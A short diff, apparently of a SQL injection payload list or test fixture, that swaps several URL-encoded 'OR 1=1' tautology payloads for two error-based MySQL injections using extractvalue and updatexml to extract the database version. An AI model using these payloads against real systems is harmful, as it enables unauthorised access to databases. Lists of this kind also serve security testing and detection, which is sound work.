@@ -1,5 +1,2 @@
-/?id=%27+OR+1%3d1+--
-/?id=%27+OR+1%3d1+--
-/?id=1+OR+1%3d1
-/?id=1%29+OR+%281%3d1
-/?id=%27+OR+1%3d1+--
+' AND extractvalue(1, concat(0x7e, version()))-- -
+' AND updatexml(1, concat(0x7e, (SELECT version())), 1)-- -
